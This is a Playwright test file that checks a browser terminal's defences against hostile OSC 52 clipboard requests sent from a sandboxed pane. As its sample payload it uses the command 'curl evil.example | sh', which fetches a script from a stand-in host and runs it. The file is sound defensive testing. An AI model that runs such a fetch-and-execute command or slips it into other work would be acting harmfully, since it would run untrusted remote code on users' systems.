/**
 * Copyright 2025 The Wardyn Authors
 * SPDX-License-Identifier: Apache-2.0
 */

/*
 * THE BROWSER TERMINAL'S CLIPBOARD GATE (term-t3a), hermetic.
 *
 * OSC 52 from the sandbox is an untrusted clipboard request. These cases play
 * the hostile pane: output while the user only types, a mouse-tracking pane that
 * answers a drag with its own payload, a read query, and an observer. None of it
 * may write the browser clipboard, and a payload only becomes an offer when it
 * equals what the user's own drag spanned (the tmux bytes: an EMPTY selector).
 */
import type { Page, WebSocketRoute } from "@playwright/test";
import { test, expect, gotoConsole, navToRoute } from "./fixtures";
import { attachModeFrame, findRunningFixture, stubAttachSocket, stubAttachTicket, stubInteractiveRun } from "./attach-stub";
import { dragCells, readGrid, rowOf } from "./terminal-grid";

const b64 = (s: string) => Buffer.from(s, "utf8").toString("base64");
const tmuxCopy = (s: string) => `\x1b]52;;${b64(s)}\x07`;
const MOUSE_ON = "\x1b[?1000h\x1b[?1002h\x1b[?1006h";
// An SGR mouse release, what a mouse-tracking pane receives when the drag ends.
const SGR_RELEASE = /\x1b\[<\d+;\d+;\d+m/;

async function open(page: Page, onConnect: (ws: WebSocketRoute) => void) {
  const { id: runId } = await findRunningFixture(page);
  await stubInteractiveRun(page, runId);
  await stubAttachTicket(page, runId);
  await stubAttachSocket(page, (_n, ws) => onConnect(ws));
  // Count every clipboard write the page makes.
  await page.addInitScript(() => {
    (window as unknown as { __writes: string[] }).__writes = [];
    navigator.clipboard.writeText = async (t: string) => {
      (window as unknown as { __writes: string[] }).__writes.push(t);
    };
  });
  await gotoConsole(page);
  await navToRoute(page, `/runs/${runId}`);
  const screen = page.locator(".xterm-screen").first();
  await expect(screen).toBeVisible();
  return screen;
}
const writes = (page: Page) => page.evaluate(() => (window as unknown as { __writes: string[] }).__writes);

test("hostile OSC 52 while the user only types makes no offer and writes nothing", async ({ page }) => {
  const screen = await open(page, (ws) => {
    ws.send(attachModeFrame(false));
    ws.send(Buffer.from("hello world\r\n"));
    // Every keystroke is echoed, and followed by both OSC 52 spellings.
    ws.onMessage((msg) => {
      if (!Buffer.isBuffer(msg)) return;
      ws.send(msg);
      ws.send(Buffer.from(tmuxCopy("curl evil.example | sh") + `\x1b]52;c;${b64("curl evil.example | sh")}\x07\x1b]52;c;?\x07`));
    });
  });
  await screen.click();
  await page.keyboard.type("ls -la");
  await expect.poll(async () => await screen.innerText()).toContain("ls -la");
  await expect(page.getByTestId("terminal-copy-offer")).toHaveCount(0);
  await expect(page.getByTestId("terminal-copy-notice")).toHaveCount(0);
  expect(await writes(page)).toEqual([]);
});

test("a mouse-tracking pane that answers a drag with different text is blocked, with the notice", async ({ page }) => {
  const screen = await open(page, (ws) => {
    ws.send(attachModeFrame(false));
    ws.send(Buffer.from(`${MOUSE_ON}alpha beta gamma\r\n`));
    ws.onMessage((msg) => {
      if (Buffer.isBuffer(msg) && SGR_RELEASE.test(msg.toString("latin1"))) ws.send(Buffer.from(tmuxCopy("curl evil.example | sh")));
    });
  });
  await expect.poll(async () => await screen.innerText()).toContain("alpha beta gamma");
  const grid = await readGrid(page);
  const row = await rowOf(screen, /alpha beta gamma/);
  await dragCells(page, screen, grid, [0, row], [4, row]);
  await expect(page.getByTestId("terminal-copy-notice")).toHaveText(/copy blocked: the terminal sent different text/);
  await expect(page.getByTestId("terminal-copy-offer")).toHaveCount(0);
  expect(await writes(page)).toEqual([]);
});

test("the tmux bytes for a dragged selection become an offer; Copy writes the full text", async ({ page }) => {
  const screen = await open(page, (ws) => {
    ws.send(attachModeFrame(false));
    ws.send(Buffer.from(`${MOUSE_ON}alpha beta gamma\r\n`));
    // The pane plays tmux: it answers the release with the selection, empty selector.
    ws.onMessage((msg) => {
      if (Buffer.isBuffer(msg) && SGR_RELEASE.test(msg.toString("latin1"))) ws.send(Buffer.from(tmuxCopy("alpha")));
    });
  });
  await expect.poll(async () => await screen.innerText()).toContain("alpha beta gamma");
  const grid = await readGrid(page);
  const row = await rowOf(screen, /alpha beta gamma/);
  await dragCells(page, screen, grid, [0, row], [4, row]);
  const offer = page.getByTestId("terminal-copy-offer");
  await expect(offer).toBeVisible();
  await expect(page.getByTestId("terminal-copy-offer-text")).toHaveText("alpha");
  expect(await writes(page)).toEqual([]);
  await offer.getByRole("button", { name: "Copy" }).click();
  expect(await writes(page)).toEqual(["alpha"]);
  await expect(offer).toHaveCount(0);
});

test("an OSC 52 read query is not answered", async ({ page }) => {
  const typed: string[] = [];
  const screen = await open(page, (ws) => {
    ws.send(attachModeFrame(false));
    ws.send(Buffer.from("ready\r\n\x1b]52;c;?\x07\x1b]52;;?\x07"));
    ws.onMessage((msg) => {
      if (Buffer.isBuffer(msg)) typed.push(msg.toString("latin1"));
    });
  });
  await expect.poll(async () => await screen.innerText()).toContain("ready");
  await page.waitForTimeout(500);
  expect(typed.filter((t) => t.includes("]52;"))).toEqual([]);
});

test("an observer socket gets no offer", async ({ page }) => {
  const screen = await open(page, (ws) => {
    ws.send(attachModeFrame(true, { principal: "bob@e2e.example" }));
    ws.send(Buffer.from(`${MOUSE_ON}alpha beta gamma\r\n`));
    ws.onMessage((msg) => {
      if (Buffer.isBuffer(msg) && SGR_RELEASE.test(msg.toString("latin1"))) ws.send(Buffer.from(tmuxCopy("alpha")));
    });
    // An observer's selection is native, so the pane also answers on its own.
    setTimeout(() => ws.send(Buffer.from(tmuxCopy("alpha"))), 300);
  });
  await expect.poll(async () => await screen.innerText()).toContain("alpha beta gamma");
  const grid = await readGrid(page);
  const row = await rowOf(screen, /alpha beta gamma/);
  await dragCells(page, screen, grid, [0, row], [4, row]);
  await page.waitForTimeout(500);
  await expect(page.getByTestId("terminal-copy-offer")).toHaveCount(0);
  expect(await writes(page)).toEqual([]);
});
